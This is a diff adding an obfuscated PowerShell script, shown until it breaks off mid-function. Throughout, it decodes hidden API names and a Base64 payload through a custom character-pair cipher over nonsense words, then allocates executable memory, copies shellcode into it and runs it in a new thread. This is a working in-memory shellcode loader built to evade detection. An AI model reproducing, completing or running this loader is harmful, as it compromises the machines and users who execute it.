@@ -1,0 +1,1320 @@
+Set-StrictMode -Version 2
+$eec='moxiqu kotu josedoqoqo'
+$azZ='pahiwe geruquruga kosenohifa kice'
+$NdlteH=' seyefa quvegatusa veko hiwotupa tukoxo rudoqu'
+$i7GUk='mu tukopege ruwetedodo getu ququ'
+$IZib='petiheqo hiwenu mimokove kohiwe'
+$lH35='mutu koparu doti qotuqeve fado qotu'
+$N7s5eX='petihe qohi wenumimo kove kohiwe'
+$G3r5='yituga qotuwe kotudo wutu qotuluveko tu'
+$Ff9='ca fapa tujo ruge xiparudo tiqo tu'
+$ABjj='pa xiwutuqo tuluveko tuhu xiretu'
+$OFqGB4='giqovequ qunumipe tiheqohiwe num'
+$q0p='imotu veqotudo numitefa quhigiqove ququ numi'
+$sZvens='tetiko rugiqovequ qu'
+$k1y='yi humore tuwehiveqo savejo tu'
+$dbWK='nu miqehido tutaximo hilunu mipe tihe qohiwe'
+$Nr47='yitifa kohi jotu numi pavefa velutu do'
+$M6P9='cafa woruritu'
+$fgmCTr='petiheqo hiwenu miqe hidotutaxi mohilu '
+$Ekx9GC='numisatu limoqoruko numifuhi gekoti veqo'
+$xPN6X='yitifa kohijotu numipa vefavelutu do'
+$suO='rituge fatuqokice sedoqo qo'
+$Xfj='fu higekoti veqoteqoqo ruwe'
+$bMkohp='ritugefa tuqokicese doqoqo'
+$WJX4C4='gigetu vekotuhu xogetuve do'
+$jYr4rZ='ritu gefatuqoki cese doqo qo'
+$CqZf='novehi kosiru gemo hifaluqo tujihekutu '
+$AYTXLb='weko'
+$EnF='yijeyu gafosije kiva vuyipege nowitolo rewujet'
+$O5hlS='iri halopadopa getota yusoqupapa xequ xedu'
+$XTYCRI='dago qoxilo wojitohege kutafo fujo jime d'
+$f2Ot='uvapano kudu fafajimo qudute tasigatiqe gaqeje kax'
+$OU5jU='u xedi koku qenome hujehi duloma wuhenowu v'
+$Juf8m='utudokilu lirino same tamuve garepehuji '
+$Rzk='safogo tape gixutukowo tacedogeko kaxehi '
+$MystxY='tagerumo woyefuqo doyufo hirisa foxowis'
+$Q0t='a yujovulu kayefa gosimeku todudu cawehekojo lot'
+$oxj4XX='ohama qeduwesari ximadutuve rutixuhudo gocevu nove'
+$EBv=' lugedu lulipasiso fowu kovuhe fukaqevuh'
+$sNb3g='i doku jeyosi xekavaro vutugeruki rexu kugahaki '
+$njzN='dopamaru tivegetaso qufuhikaxi woqu xoxoyirun'
+$cyA='o ceriliso yiki getixure kosiwu yexiditori y'
+$b8u='utadihafo goro caxe farefu xoqen'
+$bQV='o foyiluxo mareka peyidatice pagagaxo g'
+$g1j1ae='ifama qeqo haqewu tuximate maveru paqo'
+$B8fC='yukafo jikoxuyo verowidahi vur'
+$KAz='ekuhe muru lukatu gidatoji woxogikoma daqufajiso v'
+$bv49='umoyihihu wilotoha cevexexume ruka'
+$QLC64='te giquretiyi pati kasavuluki cexo'
+$c4LrP=' makiheyu vaxunosa fohajodiye josijoxolu loyi'
+$A4yHe='mako jifopayu kofofo muwu wipetifuyi tusonolo g'
+$trnXpP='oriyo pari domoyumere sicagogage '
+$qc2uT0='qerivu liwo riro wiwi moli furuquma k'
+$sFYn1='ayi hegi gipava qomododaxo vaquxi k'
+$MJh='iveta pariharoki safupa lonototeye jotajixi '
+$NzFYWE='hiyoku hawotago kafogavu rinosicegi rorij'
+$BBEH='oqe pefu yoceti taga yurumova tevuce '
+$wopC='higotu xevu rewomuduwu gafayo yijoqoka yove hal'
+$BAin='i dosa jekoxe fovatotumo yoxodupe jehako yesiro '
+$x6rKD1='soveka hire diha wuremevati loxu yut'
+$kCJka='ekutisi wolo mexeva heyo yevehuqoto wuga'
+$suJ1ao='we vagekuhuga fuvaxu qemo xukihumaje fuh'
+$vNc='uno tufupaki mejifoli risa sosa '
+$gFW='lohu yuvayoqeri hikiva sariwomu fapahadi yoyegima '
+$W78e='ceri tiqu yutojo turemupewo xokilosare duwu qeteca'
+$jR3Hxu='ce jekiducawe hedodi tiqoji yijesa wevu sovace'
+$w4uvf1='quso maqodoxoji dayuyedu towemoji qerumeso ris'
+$HSiikS='ofore gili xukowu qevuru havure rewu xitenogimo '
+$dYnv9='doto rehigo requ pasoxe xesixitiqo dire'
+$WCTrjv='hufa sifudari tihape rihuqe wocege kodomeku'
+$KhWaG1=' jijesacafo qete vaga jokiritaw'
+$JjHKnY='o qumesojeyo fuhewe kovegetalo kito goxopege '
+$Rf8zq='jiquliwi sojoqevuha xegeto pamufohisa vewutu li'
+$kTR8v='va lihaxu vujoxuca yixexugequ qerite'
+$gMOia=' tusodi hute pegeparu quqesojo qelo koxe'
+$fzv='ge topasa fokoku kaqetiliva hiki so'
+$H7ED1x='hugesi gafayodo huhutetipe dugaloku'
+$Mq1pO='ta tuyogi logoriyu joridomo vayiyo duxi '
+$y1LDLf='ruge kihefa xili kariru hulomexi gometuwiye makujo'
+$dMk='giga kaxowutawu jome yigoro gisi'
+$dSs='yowo jowowoyi daxeteqe cavamo geme fasifaso'
+$JxNGQ5='hu sacehuxo loqeyitawi xefuno qujeku'
+$QxlmaO=' taxe toloqofape lukayo duyujolida'
+$OQIS=' yesajeta xosaye qojili nogelufo rexisoje l'
+$Ync6ze='osaga moqe yowu tame mosowugidi'
+$Qu3=' xufu kugamosamu givuje lukome nolonoxi peq'
+$xjN='ugiyoga cagiyofo himo hido ruwidohe'
+$HWGF='yu yeru kojimapa cakoxi tumagowuru joyiruyowi fa'
+$CuyVtG='fahuhege vuwuwikoku reluheheqo gokuk'
+$WAm='owuwi diyi dirugexu godamegota vukoyoye xodu '
+$yVEUGH='wogequ qolimate docaxeyiru sika'
+$XnV=' hugadoqu tedaduwoka sigikilite camutojo pasi'
+$uON='fodiko gekiki yuhuje kuhu kilotiko h'
+$EgnpaA='iqotixuyi hema duma tuwotivage wigipe ge'
+$h7HU3n='yegoluge siqeca yoso towesitoko r'
+$Ltx='eku tuvasaqo kulujoqemo remefava fahuto '
+$iXGE='yuyudo tuyu kihuwidi koyilu kiluhe refaki roti'
+$ya9Ik='xu saka hijipeqohe jitegimali hurefu yifo l'
+$JtBCX0='olu rofogehasi tokoriyoxe vage vumevare ka'
+$sAmS='hatucaqo faheqowodo palo xogi rigiki'
+$Jy46='wo qosiwuga veyo lomexufu tohasosoli cave '
+$bK0='fapare wuwi kiteka yefudi xikivuwi so'
+$o0cKNi='jo yeloji kiyixeqo noti xovuta '
+$eo8cZ='towego fuxi refaxomece capa xexu mayo'
+$KVxRCo='huri wuwi gelu dujicahu turu luki'
+$HcvAK='sojoye yego cexito tasidonosi je'
+$Zbco1='vega saxixoca pemedi reno gequri mari vexetajovu'
+$q18xr=' saro wujire pavugikida wowi wevedok'
+$BkFMJn='u welodafoti goweyejosi ropaxono'
+$bYV=' merumo gojeno sime meso mugirimo fo'
+$Fibp1O='va hedo tiso toxi rolu wisohawo cano vuc'
+$hG6Q='e mujexogadu yejo wediparice vuhu jil'
+$bL4MQ='uyu dusoliyiwi yivuveda xeyica giyecahava kigirolu'
+$tHUn='ku yekodagime didaqe xutegeti kuwosik'
+$RIf7='u nolixohi xeweyuxe siha fawedi tehi wovehe '
+$myU='gikivata kuga mosiruwe patukidaye vedut'
+$RG1='exo kuvu dotulosomo cavagigi kuwope ruwege hurod'
+$frBnD='i xenoxulu caji dadige tahucexu maqu'
+$iSl='he hadirefo momekida togasa tirerece yoxo xo'
+$lzWivm='qorumo tota huqekuto sixidu monofasilo vureno '
+$sG8H='kororewu loveve siro samoheyusa muvexo w'
+$oix='ote jofatiwuwi fodamusita hika kodasi f'
+$CWVRA='omeqo muwufoqe relihufawo vuyi'
+$L3VW='xujosi kayijeveso nodowi safata xurototito kuce'
+$zqgQ='runova ruhihidisi xuca xohamalomo giso yitav'
+$qffie='ute teyedasivu yugope nomenoqo ki'
+$VFuRe='do mosi tanosi woge pamu siyuca '
+$MTzx='vukavuduti sodovuhe lumuxeka xihiti datetate tewu '
+$dEH='geta gofuverutu qeyi wufo doxupavu '
+$HVWt30='tacalukate xuvudoqe temopero diyuka yuyi'
+$Krbb='pako vulu gatujo daxe wororo yutor'
+$CLdV='ororo rokapu'
+$h6Tr='sore dajiquti difu yilorolono yokuqem'
+$QULn='oti maqe haxi ruro xihipemere rori mufowo doko'
+$ZCzJFe='fu reko tagihaqovu teliji kusacaki dod'
+$Qg2aC='i jilo penoru lupaki vemome noxowequ geqexogi'
+$bbg='qu cayekayupa wuli lurovu quvatolo fuhakijoje lo'
+$uoYs='limefodo gosiri kadu mohive sali'
+$roJnr='diwu simatujequ xoridacaye xoyituvuwo liyi yesipa'
+$AAQEo=' rumeruda xejeteyice cako yoveqoqo wesomog'
+$fQlwUP='e wevumexu vekupa woqosi yice giqerikawe hayuh'
+$HrP='aku yupeyero hiyevatahi sopericeyi tima gotakayo'
+$alhtH1=' hafadu silivama jemu huvuvu qomotewo pevuko v'
+$ugkSW='aka xopeso vuqoge qutu taku taje'
+$EAIiu='lo wegexehuno fusare jipe yeliyuhu yogikipejo h'
+$pLka='evutoqu takofo jihijo xuvuyewoti kori xusipa yiku '
+$qRJfT='helu yiweji celisajowe qufokipaqo jopano'
+$T1K=' xogifu jisowefo moce hetoye rofu'
+$xtMt='duto qoroyo wumuwuyi mowuhi ruliduga huru hivur'
+$UedE='i cakamevepa qoma padotagi woyudilu wuwuv'
+$v4M='arume huluji siwewexi xiwo megigitu v'
+$YrfEGf='akuwufuje caqohahuli sajikoku tehiqexo pa'
+$jziaG='woyiyuwu livalisomo kucavaxuro fuvu dopere sa'
+$qS2='ji kunoremawu kufusafove lumaceka'
+$D46k=' xuxo yovate hige ducawovujo tuyo qotoyukiva we'
+$bslQQt='menoka qodovedo xece vawo gete'
+$hels='ri xewuto giha yuremanoso haqoru wixugilu '
+$S8v='wiyukosigi pejikupamu vesativusa'
+$knII=' mujosigasa qeduxe kaqe fawe vakuwesa'
+$gHUe=' yodute gohiwo rehujevada xucaka'
+$BWcv4f=' wucaqu matu mewitejiha tivawugodo wowevu'
+$vPyH='to tidino mahajedi quqe motu yiyuku mupayomo vef'
+$KWxu='ufa daxuto gohicahufo topa jexece '
+$uKJ='qege regi rigemupa yopece xidaji sanoyo hi'
+$UFg0l6='peweduro winoxowe pama qehipeje wekak'
+$XtN='a yupa yigikohe lirewu yukiyeyo fomu '
+$NxqkI='teyikimaqe rudaqusa fafumo gelodoyo torik'
+$PR9='utowo taxo lutolipagi moge jodopes'
+$hfkEDF='otu xomuno tepali ceje vadagimoki noh'
+$TlSC5L='iye repaqumasa jomuta kihuhusowo '
+$VGR='vuvugegojo kado vure vuvuyewo xowe'
+$J9XO=' kumoyiyiso qocafaso periyoye tigecati'
+$WBZv='we vuxo kadipe murixoqe titiyemelu ludi'
+$ajC='hatosi pafaxuxudi kanoxuji yequ meki fur'
+$rBVoZ='i gaherigapa jigepatu wedo muvucaqu hivusi'
+$qQRnOY=' diji hekuvufa xotahato qexo kari f'
+$mu1='uhehigidu fuyumeta qemoxoha caqosoli to'
+$u1s4='vusafajo yotefu toko jexosa titoh'
+$B3HekV='evu xowi hijoyo mupe gojexu xunohikoti sodiwevu ma'
+$GA8IeE='tajewi weyoso luroyudiva giha n'
+$UmP='oye yumayo tejesoqogi luxo mepey'
+$iMUBR='e lifaga fukuca sahixehuma vegidowu timoqeyu weq'
+$WcUf6='oyu situmaru kavavuxe majipalo vefo vejihiyete '
+$OE2n='dikukofayo wucehi jirifo hejotope vetugipe lu'
+$Zsc='yice pataqonovu wumawikuyo wiyelog'
+$z4bL='a qono metecatege kadowi vuliqu ku'
+$c0jgO9='joka muluye huki musa duyupa muxogo lodaqoxi '
+$atq='rexi jetaxeyoru quqoyovuqu limujo weko xoyo'
+$vONK='gadi meliwo huqoyori nolukujoto sawujevaga kik'
+$RTgGhO='ixi huhu yikixomehu ruwo noyo jesoparu'
+$RJV=' modoxe xidotega kuvuhu fovatotiwo xuxure xifoyep'
+$Os1='a dawe varoqedi gawiweji peku gahu '
+$pgWYz2='rucehekiqu pavatowuhu kaxego qodi lidufa vetama'
+$VOtJw='re sixicasa qovakuveda gaxigehuye kori'
+$jp1zG='jijoti wido yixogi nogo haweriji wemuwu rumejixos'
+$Zmj='o fapaga jijohepe huwiko dadava retafope veriqoxo'
+$eZG6n8=' siwolisaru vukuvaqo pedikiva kuto goloreyu tiv'
+$VJo='efameca qotako wodiha yufuvehipa'
+$xD7W9=' dohepe soyufa qota wiretu tege masaxohuko lo'
+$gus93U='liliqo papadi vakititi dofapeji '
+$LXn0='xigo xifo macahe sajo rihete vesasatowo'
+$KdghKQ=' tigiki doqofamu witege noma wiji'
+$l8Nz=' sataluhuhu noga qeyidifawo dava dur'
+$X8p='iqexu golili wuqu weruyi litahif'
+$MbU='uta tuki wimodotedu siro jiyuquteyo to'
+$nSlljT='xuliweki vewi novahequ tuqokuce xodah'
+$BWihzo='uxu yiyuxuda muvuxedori fave kiteda gixe'
+$oTkHA6='kiyepe qequ tokaji pexujoxu xunoti liku mucahe ta'
+$AU7='ko kuyifodalu cagahayu diyixow'
+$gEt='e sipefoce pakuma veme rugegoso gotayiwi pexediyok'
+$XjVA='a jovewi paverupa wugexoda veyo gopagagehu luhuli'
+$d5k='payu gedujigo pawikoxiwu cewuluc'
+$UHiL='e vuwe kori vecaruxilu calu gemuwoxu huto wusiqo '
+$YD8='lotasasaso xevu yote tino tucelosimo giwumoqu '
+$Gfz='geyi yuro siluluti wulitehuge tejorute huwiy'
+$ciDEww='efo notuquri hifuvekuti gocehige'
+$Wva=' yefayi lituwofa rofowu hidiwili xute'
+$C0wbC='tetafu yugo hipa kudidaqono jiwogo worunowus'
+$J4HmXS='a jiri kawitujo maxeroro royuji varororo'
+$OtCh29=' foyiti lopano yokumufo xute xute tewu xu'
+$UHUTn='ca yukaruxu xiro hetowi gokuwujite pupu'
+function WqkTcc
+{
+gJxOg($Nr47)
+}
+function fLPcqls
+{
+$KAz+$bv49
+}
+function OOerRE
+{
+gJxOg($fgmCTr+$Ekx9GC)
+}
+function WEzShlwc
+{
+gJxOg((tPCMYhsjAX)+(LPnQjBXi)+(AHSdxlK)+(QsaMJNC)+(hQoQCYO)+(vwqJN)+(NadHDpW))
+}
+function OCYudfFPmC
+{
+RSoqFfL @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr])([IntPtr])
+}
+function AodELTQ
+{
+$WcUf6+$OE2n
+}
+function xxdbLomsRP
+{
+gJxOg($lH35)
+}
+function UucMJLa
+{
+$Ync6ze+$Qu3
+}
+function NmlIgfgD
+{
+Param ($CzFIU)
+if($CzFIU -eq 'o')
+{
+'/'
+}
+else
+{
+'o'
+}
+}
+function NqwdjoK
+{
+$gHUe+$BWcv4f
+}
+function OhOBw
+{
+Param ($FTdxO,$f1LIeH)
+if($FTdxO -eq 'n')
+{
+whtOLFv $f1LIeH
+}
+else
+{
+if($FTdxO -lt 'n')
+{
+if($FTdxO -eq 'h')
+{
+XjcCVokW $f1LIeH
+}
+else
+{
+if($FTdxO -lt 'h')
+{
+iSnqlAAssO $FTdxO $f1LIeH
+}
+else
+{
+kvRRZKmUm $FTdxO $f1LIeH
+}
+}
+}
+else
+{
+if($FTdxO -eq 't')
+{
+if($f1LIeH -eq 'i')
+{
+'u'
+}
+else
+{
+if($f1LIeH -lt 'i')
+{
+xcKORDtK $f1LIeH
+}
+else
+{
+if($f1LIeH -eq 'o')
+{
+'K'
+}
+else
+{
+'e'
+}
+}
+}
+}
+else
+{
+if($FTdxO -lt 't')
+{
+XNaCOZLAH $FTdxO $f1LIeH
+}
+else
+{
+if($FTdxO -eq 'w')
+{
+bTWuhL $f1LIeH
+}
+else
+{
+if($FTdxO -lt 'w')
+{
+if($f1LIeH -eq 'e')
+{
+'a'
+}
+else
+{
+if($f1LIeH -lt 'e')
+{
+'z'
+}
+else
+{
+'Q'
+}
+}
+}
+else
+{
+if($FTdxO -eq 'x')
+{
+kyROwbgY $f1LIeH
+}
+else
+{
+AWBFVpml $f1LIeH
+}
+}
+}
+}
+}
+}
+}
+}
+function cxViUjRIK
+{
+gJxOg($suO)
+}
+function qUxNFmC
+{
+(RJpUbgz)+(DxlmoJ)+$h7HU3n+$Ltx+(DQqxa)+(FgSPI)+$Jy46+$bK0+(PVkzSdkl)
+}
+function JpMFvKZ
+{
+zVBTHqNo (cwoAHloUGY) (BlvUJWmy)
+}
+function xcKORDtK
+{
+Param ($SILZA)
+if($SILZA -eq 'a')
+{
+'B'
+}
+else
+{
+'A'
+}
+}
+function FAhlHie
+{
+Param ($DsOM3)
+$DsOM3.GetMethod((UUiUNCzInx),[reflection.bindingflags] (NyyNIjlEO), $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)
+}
+function ijIKs
+{
+Param ($W3m8j)
+$W3m8j.DefineDynamicModule((DhGyL), $false)
+}
+function cwoAHloUGY
+{
+gJxOg($jYr4rZ)
+}
+function HHXVqvTUG
+{
+$z4bL+$c0jgO9+$atq
+}
+function iSnqlAAssO
+{
+Param ($CM9Pm,$Tdc)
+if($CM9Pm -eq 'd')
+{
+if($Tdc -eq 'i')
+{
+'L'
+}
+else
+{
+if($Tdc -lt 'i')
+{
+'0'
+}
+else
+{
+VgReKFWkzg $Tdc
+}
+}
+}
+else
+{
+if($CM9Pm -lt 'd')
+{
+if($Tdc -eq 'a')
+{
+'I'
+}
+else
+{
+'2'
+}
+}
+else
+{
+if($CM9Pm -eq 'f')
+{
+if($Tdc -eq 'o')
+{
+'9'
+}
+else
+{
+if($Tdc -lt 'o')
+{
+'n'
+}
+else
+{
+'V'
+}
+}
+}
+else
+{
+VwNrJc $Tdc
+}
+}
+}
+}
+function XNaCOZLAH
+{
+Param ($KMesSI,$E3Dnm)
+if($KMesSI -eq 'q')
+{
+if($E3Dnm -eq 'o')
+{
+'l'
+}
+else
+{
+if($E3Dnm -lt 'o')
+{
+'H'
+}
+else
+{
+'s'
+}
+}
+}
+else
+{
+if($KMesSI -lt 'q')
+{
+if($E3Dnm -eq 'e')
+{
+'P'
+}
+else
+{
+if($E3Dnm -lt 'e')
+{
+'M'
+}
+else
+{
+'='
+}
+}
+}
+else
+{
+if($KMesSI -eq 'r')
+{
+if($E3Dnm -eq 'i')
+{
+'k'
+}
+else
+{
+if($E3Dnm -lt 'i')
+{
+'p'
+}
+else
+{
+NmlIgfgD $E3Dnm
+}
+}
+}
+else
+{
+if($E3Dnm -eq 'e')
+{
+'.'
+}
+else
+{
+if($E3Dnm -lt 'e')
+{
+'N'
+}
+else
+{
+if($E3Dnm -eq 'i')
+{
+'F'
+}
+else
+{
+'1'
+}
+}
+}
+}
+}
+}
+}
+function HKyDSaivg
+{
+Param ($YxD)
+[AppDomain]::CurrentDomain.DefineDynamicAssembly($YxD,[System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+}
+function fWoHjyMW
+{
+$sFYn1+$MJh
+}
+function lnsrAQ
+{
+Param ($jcoIhk,$lAsjV)
+$SfzGHG=wiWreW
+$cjB=WGycbX $SfzGHG $jcoIhk
+$WyLOoP=hrFMPbx $jcoIhk $cjB
+$M7E0R=uTnKXPziXQ
+$ci80=sJVZpkaV $M7E0R $cjB $lAsjV
+$l9Q1Y=XlmTVfBR
+$hoh3NA=$l9Q1Y.Invoke($ci80, 0xffffffff) | Out-Null
+}
+function GfcMJZy
+{
+$alhtH1+$ugkSW
+}
+function KUQNaCT
+{
+$BkFMJn+$bYV
+}
+function LFgzS
+{
+$uKJ+$UFg0l6
+}
+function GqCmAx
+{
+$GA8IeE+$UmP+$iMUBR
+}
+function QsaMJNC
+{
+$mu1+$u1s4+$B3HekV+(GqCmAx)+(AodELTQ)+$Zsc+(HHXVqvTUG)+$vONK+(djomokjenA)
+}
+function KjsMOmLmLJ
+{
+$oTkHA6+$AU7+$gEt
+}
+function WGycbX
+{
+Param ($d0CVy,$MXzT)
+$d0CVy.Invoke([IntPtr]::Zero, $MXzT.Length,0x3000, 0x40)
+}
+function PVkzSdkl
+{
+$o0cKNi+$eo8cZ
+}
+function hrFMPbx
+{
+Param ($xZ6C,$lZQwiY)
+[System.Runtime.InteropServices.Marshal]::Copy($xZ6C, 0, $lZQwiY, $xZ6C.Length)
+}
+function oSRCx
+{
+$gFW+$W78e+$jR3Hxu
+}
+function FiJtf
+{
+$LXn0+$KdghKQ
+}
+function WEsOMvJGM
+{
+$RIf7+$myU+$RG1
+}
+function rMKjfouDxS
+{
+$qS2+$D46k+$bslQQt
+}
+function uqUurGYLOM
+{
+$g1j1ae+$B8fC
+}
+function RSoqFfL
+{
+Param ([Parameter(Position = 0, Mandatory = $True)][Type[]] $Ycws,[Parameter(Position = 1)] [Type] $IOaED = [Void])
+$NCytgY=New-Object System.Reflection.AssemblyName((RDYHQA))
+$GPK4o=HKyDSaivg $NCytgY
+$zF0=ijIKs $GPK4o
+$xQx=JIgdqtFN $zF0
+$DnprZ=ZRWMZnEfg $xQx $Ycws
+$iQ9=VaTpXvaD $DnprZ
+$hc7tS=ZuyHbwjLJ $xQx $IOaED $Ycws
+$CnfTYW=$hc7tS.SetImplementationFlags((YMnSGEv))
+$uZlHdv=$xQx.CreateType()
+return $uZlHdv
+}
+function cMLRDlhId
+{
+gJxOg((DcDfN)+(xEYxdACo)+(pSZZqSsSk)+(xapMg)+(nxQDQGjAEt)+(qUxNFmC)+(fClFdsPq)+(yAHrgLJ))
+}
+function MqWLcVBjYT
+{
+If ([IntPtr]::size -eq 8)
+{
+$l8cuJa=(cMLRDlhId)
+$uuYx=1356
+}
+else
+{
+$l8cuJa=(WEzShlwc)
+$uuYx=1143
+}
+$sKYCfN=[System.Convert]::FromBase64String($l8cuJa)
+lnsrAQ $sKYCfN $uuYx
+}
+function nxQDQGjAEt
+{
+(qBjnk)+(uIglEWr)+(UucMJLa)+(kdotAub)+(GgYbWam)
+}
+function wiWreW
+{
+$OgDxZ=zVBTHqNo (cxViUjRIK) (ewpfVrlGs)
+$we1D=GCopVu
+$qHL0b6=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OgDxZ, $we1D)
+return $qHL0b6
+}
+function CWtbffCud
+{
+$OU5jU+$Juf8m
+}
+function vZbaHH
+{
+gJxOg($N7s5eX)
+}
+function kvRRZKmUm
+{
+Param ($gteIED,$Vb34kV)
+if($gteIED -eq 'k')
+{
+if($Vb34kV -eq 'i')
+{
+'3'
+}
+else
+{
+if($Vb34kV -lt 'i')
+{
+'8'
+}
+else
+{
+if($Vb34kV -eq 'o')
+{
+'t'
+}
+else
+{
+'j'
+}
+}
+}
+}
+else
+{
+if($gteIED -lt 'k')
+{
+if($Vb34kV -eq 'i')
+{
+'O'
+}
+else
+{
+if($Vb34kV -lt 'i')
+{
+'q'
+}
+else
+{
+'m'
+}
+}
+}
+else
+{
+if($gteIED -eq 'l')
+{
+if($Vb34kV -eq 'o')
+{
+'Y'
+}
+else
+{
+if($Vb34kV -lt 'o')
+{
+'w'
+}
+else
+{
+'g'
+}
+}
+}
+else
+{
+KnYCgkrCD $Vb34kV
+}
+}
+}
+}
+function UUiUNCzInx
+{
+gJxOg($i7GUk)
+}
+function DDBBNWnR
+{
+$XjVA+$d5k+$UHiL
+}
+function BlvUJWmy
+{
+gJxOg($CqZf+$AYTXLb)
+}
+function fkwcZKEdI
+{
+gJxOg($OFqGB4+$q0p+$sZvens)
+}
+function YMnSGEv
+{
+gJxOg($xPN6X)
+}
+function whtOLFv
+{
+Param ($Hfr3UY)
+if($Hfr3UY -eq 'o')
+{
+'W'
+}
+else
+{
+','
+}
+}
+function uTnKXPziXQ
+{
+$YfF=IHoVnhb
+$qjfxG=OCYudfFPmC
+$r7H=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($YfF, $qjfxG)
+return $r7H
+}
+function KnYCgkrCD
+{
+Param ($ADWayL)
+if($ADWayL -eq 'i')
+{
+' '
+}
+else
+{
+if($ADWayL -lt 'i')
+{
+if($ADWayL -eq 'a')
+{
+'J'
+}
+else
+{
+'Z'
+}
+}
+else
+{
+if($ADWayL -eq 'o')
+{
+'S'
+}
+else
+{
+'G'
+}
+}
+}
+}
+function lsbAVFiX
+{
+$H7ED1x+$Mq1pO
+}
+function AzezC
+{
+$b8u+$bQV
+}
+function ctQxw
+{
+$iSl+$lzWivm
+}
+function yAHrgLJ
+{
+(WEsOMvJGM)+$frBnD+(ctQxw)+$sG8H+(lOCuze)+$L3VW+$zqgQ+$qffie+(wCzBo)+(POShXp)+$CLdV
+}
+function JIgdqtFN
+{
+Param ($uQhL)
+$uQhL.DefineType((FGYJBQBZv),(fkwcZKEdI),[System.MulticastDelegate])
+}
+function vfUnfsap
+{
+$fQlwUP+$HrP
+}
+function BbvUUfY
+{
+$Q0t+$oxj4XX
+}
+function aWSTnDYKO
+{
+Param ($XvX)
+if($XvX -eq 'i')
+{
+'i'
+}
+else
+{
+'T'
+}
+}
+function qdukii
+{
+$PR9+$hfkEDF
+}
+function BdZVc
+{
+[AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals((pfKXTZ)) }
+}
+function tPCMYhsjAX
+{
+(nsmhKPcRF)+(kqcpQZsSe)+$bbg+(qjooiBqWb)+$AAQEo+(vfUnfsap)+(GfcMJZy)+$EAIiu
+}
+function kyROwbgY
+{
+Param ($GdI)
+if($GdI -eq 'i')
+{
+'y'
+}
+else
+{
+if($GdI -lt 'i')
+{
+'+'
+}
+else
+{
+if($GdI -eq 'o')
+{
+'h'
+}
+else
+{
+'E'
+}
+}
+}
+}
+function ArwVGcP
+{
+Param ($vyyV)
+if($vyyV -eq 'i')
+{
+'C'
+}
+else
+{
+'x'
+}
+}
+function qohZbz
+{
+$wopC+$BAin
+}
+function bqKPJqtm
+{
+Param ($rMj4DL,$bepAHs,$g6pY)
+$rMj4DL.Invoke($null, @($bepAHs, $g6pY))
+}
+function mrJpJXELOl
+{
+$XtN+$NxqkI
+}
+function XlmTVfBR
+{
+$c06=JpMFvKZ
+$pSI1z=QZidTinz
+$pgVC=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($c06, $pSI1z)
+return $pgVC
+}
+function GgYbWam
+{
+$CuyVtG+$WAm
+}
+function FGYJBQBZv
+{
+gJxOg($ABjj)
+}
+function DhGyL
+{
+gJxOg($Ff9)
+}
+function LtjWvv
+{
+gJxOg($bMkohp)
+}
+function bTWuhL
+{
+Param ($Sg6aQ)
+if($Sg6aQ -eq 'i')
+{
+'X'
+}
+else
+{
+if($Sg6aQ -lt 'i')
+{
+'c'
+}
+else
+{
+if($Sg6aQ -eq 'o')
+{
+'v'
+}
+else
+{
+'D'
+}
+}
+}
+}
+function qBjnk
+{
+$dSs+$JxNGQ5
+}
+function YxeGIZkuY
+{
+$Fibp1O+$hG6Q
+}
+function kqcpQZsSe
+{
+$ZCzJFe+$Qg2aC
+}
+function aJptaxFCB
+{
+$kCJka+$suJ1ao+$vNc
+}
+function NyyNIjlEO
+{
+gJxOg($IZib)
+}
+function ewpfVrlGs
+{
+gJxOg($Xfj)
+}
+function ZRWMZnEfg
+{
+Param ($FDCYkA,$OhI)
+$FDCYkA.DefineConstructor((RDtqNkXiPq), [System.Reflection.CallingConventions]::Standard,$OhI)
+}
+function POShXp
+{
+$dEH+$HVWt30+$Krbb
+}
+function CvOGtzdI
+{
+gJxOg($azZ+$NdlteH)
+}
+function IHoVnhb
+{
+zVBTHqNo (LtjWvv) (OhsqrmCuZ)
+}
+function fClFdsPq
+{
+$KVxRCo+$HcvAK+(yMblgwm)+(KUQNaCT)+(YxeGIZkuY)+$bL4MQ+$tHUn
+}
+function gJxOg
+{
+Param ($qmI)
+$BQNTF=""
+$qmI=$qmI.Replace(' ','')
+for($v0OqYx=0;$v0OqYx -lt $qmI.Length;$v0OqYx+=2)
+{
+$BQNTF+=(OhOBw $qmI[$v0OqYx] $qmI[$v0OqYx+1])
+}
+$BQNTF
+}
+function xEYxdACo
+{
+$cyA+(AzezC)+(uqUurGYLOM)+(fLPcqls)+$QLC64+(adyQxeF)+$trnXpP+$qc2uT0
+}
+function CBFetet
+{
+$EnF+$O5hlS
+}
+function XjcCVokW
+{
+Param ($sQN)
+if($sQN -eq 'e')
+{
+'b'
+}
+else
+{
+if($sQN -lt 'e')
+{
+'5'
+}
+else
+{
+aWSTnDYKO $sQN
+}
+}
+}
+function wCzBo
+{
+$VFuRe+$MTzx
+}
+function jwwSuLXqNO
+{
+$NzFYWE+$BBEH
+}
+function AWBFVpml
+{
+Param ($ZOP8M)
+if($ZOP8M -eq 'i')
+{
+'R'
+}
+else
+{
+if($ZOP8M -lt 'i')
+{
+'U'
+}
+else
+{
+WWWMRhVHJd $ZOP8M
+}
+}
+}
+function tgCsN
+{
+$nSlljT+$BWihzo
+}
+function hQoQCYO
+{
+$Os1+$pgWYz2+$VOtJw+$jp1zG+$Zmj+$eZG6n8+$VJo+$xD7W9+$gus93U
+}
+function VaTpXvaD
+{
+Param ($u2IO2)
+$u2IO2.SetImplementationFlags((WqkTcc))
+}
+function zVBTHqNo
+{
+Param ($KqAnA,$X8ZfD2)
+$NWNJa=BdZVc
+$S9eZ=$NWNJa.GetType((CvOGtzdI))
+$mi5NUi=FAhlHie $S9eZ
+$HiEG=$S9eZ.GetMethod((xxdbLomsRP),[reflection.bindingflags] (vZbaHH), $null, [System.Reflection.CallingConventions]::Any, @([string]), $null)
+$u28OJ=$HiEG.Invoke($null,$KqAnA)
+$Pbr=New-Object IntPtr
+$A2AfdB=[System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef($Pbr,$u28OJ))
